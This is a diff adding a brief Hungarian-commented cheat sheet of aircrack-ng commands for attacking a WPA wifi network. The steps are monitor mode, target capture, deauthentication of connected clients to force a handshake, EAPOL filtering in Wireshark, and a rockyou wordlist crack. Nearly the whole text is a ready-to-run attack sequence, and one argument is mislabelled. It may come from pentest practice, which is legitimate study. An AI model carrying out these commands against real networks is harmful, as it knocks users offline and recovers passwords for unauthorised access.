@@ -1,0 +1,22 @@
+//hálózatok
+iwconfig
+//monitor mód a wifi driveren
+sudo airmon-ng start wlan0
+sudo airmon-ng 
+//hálózatok listázása (BSSID, channel érdekel)
+sudo airodump-ng wlan0
+
+//2. ablak, monitoring
+sudo airodump-ng -w név1 -c 2 --bssid bssid szám wlan0
+
+//3. ablak, deauth
+sudo aireplay-ng --deauth (channel szám) -a (bssid szám) wlan0
+
+//4. ablak, wireshark
+wireshark név1-01.cap
+//filter eapol
+
+airmon-ng stop wlan0
+
+//wordlist attack
+aircrack-ng név1-01.cap -w /usr/share/wordlists/rockyou.txt 
